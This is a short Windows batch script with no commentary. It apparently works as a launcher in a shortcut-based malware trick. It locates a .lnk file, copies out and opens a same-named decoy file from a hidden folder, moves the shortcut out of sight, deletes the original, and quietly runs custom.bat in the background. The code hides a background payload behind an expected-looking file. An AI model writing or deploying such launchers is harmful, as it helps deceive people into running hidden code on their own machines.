@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

for %%I in (.) do set hidden=%%~nxI

cd ..
for /R "%cd%" %%F in (*.lnk) do (
    set name=%%~nxF
    set name=!name:~0,-4!
)
cd !hidden!

echo f | xcopy "!name!" "../!name!"

cd ..
start "" "!name!"
cd !hidden!

cd ..
echo f | xcopy "!name!.lnk" "!hidden!/!name!.lnk" /f /y
del "!name!.lnk"
cd !hidden!

start /b cmd /c custom.bat